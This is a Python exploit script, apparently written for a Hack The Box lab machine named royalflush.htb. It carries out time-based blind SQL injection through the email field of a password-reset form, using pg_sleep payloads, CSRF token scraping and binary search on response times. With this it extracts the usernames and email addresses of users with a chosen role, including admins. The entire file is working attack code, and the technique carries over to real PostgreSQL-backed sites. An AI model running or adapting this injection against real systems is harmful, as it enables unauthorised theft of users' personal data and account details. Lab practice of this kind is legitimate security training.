# !/usr/bin/env python3
"""
Extract username + email for users with a given role_id from RoyalFlush /forgot SQLi.
Default role_id=1 (regular users). Change ROLE_ID below to extract other roles.
"""

import warnings

warnings.filterwarnings("ignore")

import re
import time
import urllib3
import requests

urllib3.disable_warnings()

BASE_URL = "https://www.royalflush.htb"
FORGOT_URL = f"{BASE_URL}/forgot"
SLEEP = 3
THRESHOLD = SLEEP * 0.7
ROLE_ID = 1  # change to 2 for admins

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://www.royalflush.htb",
    "Referer": "https://www.royalflush.htb/forgot",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers",
    "Connection": "keep-alive",
}


def get_csrf_and_session():
    s = requests.Session()
    s.headers.update(HEADERS)
    r = s.get(FORGOT_URL, verify=False, timeout=15)
    m = re.search(r'<input\b[^>]*name\s*=\s*"csrf_token"[^>]*value\s*=\s*"([^"]+)"', r.text)
    if not m:
        m = re.search(r'<input\b[^>]*value\s*=\s*"([^"]+)"[^>]*name\s*=\s*"csrf_token"', r.text)
    if not m:
        raise RuntimeError(f"Could not extract csrf_token (status {r.status_code})")
    return s, m.group(1)


def send_payload(s, csrf, condition):
    payload = f"habibhassan293@gmail.com'||(SELECT pg_sleep({SLEEP}) FROM users JOIN user_roles USING(user_id) WHERE ({condition}) LIMIT 1)::text||'"
    data = {"email": payload, "csrf_token": csrf}
    start = time.time()
    try:
        s.post(FORGOT_URL, data=data, verify=False, timeout=SLEEP + 10)
    except requests.exceptions.ReadTimeout:
        pass
    return time.time() - start


def is_true(s, csrf, condition):
    return send_payload(s, csrf, condition) >= THRESHOLD


def get_int(s, csrf, expr, hi=256):
    low, high = 0, hi
    while low < high:
        mid = (low + high) // 2
        if is_true(s, csrf, f"({expr}) > {mid}"):
            low = mid + 1
        else:
            high = mid
    return low


def get_char(s, csrf, expr):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if is_true(s, csrf, f"COALESCE(ascii(({expr})),0) > {mid}"):
            low = mid + 1
        else:
            high = mid
    return chr(low) if low > 0 else ''


def get_string(s, csrf, expr, label=""):
    length = get_int(s, csrf, f"length(({expr}))")
    print(f"[+] {label} length: {length}")
    print(f"[*] extracting: ", end="", flush=True)

    value = ""
    for pos in range(1, length + 1):
        c = get_char(s, csrf, f"substring(({expr}),{pos},1)")
        if not c:
            c = "?"
        value += c
        print(c, end="", flush=True)
    print()
    return value


def main():
    s, csrf = get_csrf_and_session()
    print(f"[+] csrf_token: {csrf[:50]}...")

    print("[*] Sanity check...")
    t0 = send_payload(s, csrf, "1=0")
    t1 = send_payload(s, csrf, "1=1")
    print(f"    false -> {t0:.2f}s")
    print(f"    true  -> {t1:.2f}s")
    if t1 < THRESHOLD:
        print("[!] Oracle failed. Adjust SLEEP.")
        return

    print(f"[*] Counting users with role_id={ROLE_ID}...")
    count = get_int(s, csrf,
                    f"SELECT count(*) FROM users JOIN user_roles USING(user_id) WHERE user_roles.role_id={ROLE_ID}",
                    hi=64)
    print(f"[+] {count} user(s) found\n")

    users = []
    for i in range(count):
        print(f"[*] Extracting user #{i} (role_id={ROLE_ID})...")
        expr = f"SELECT users.username||'|'||users.email FROM users JOIN user_roles USING(user_id) WHERE user_roles.role_id={ROLE_ID} ORDER BY users.user_id OFFSET {i} LIMIT 1"
        data = get_string(s, csrf, expr, label=f"user #{i}")
        parts = data.split("|")
        users.append({
            "username": parts[0] if len(parts) > 0 else "",
            "email": parts[1] if len(parts) > 1 else "",
        })
        print(f"[+] user #{i}: {users[-1]}\n")

    print(f"=== Users with role_id={ROLE_ID} ===")
    for u in users:
        print(f" - {u['username']} | {u['email']}")


if __name__ == "__main__":
    main()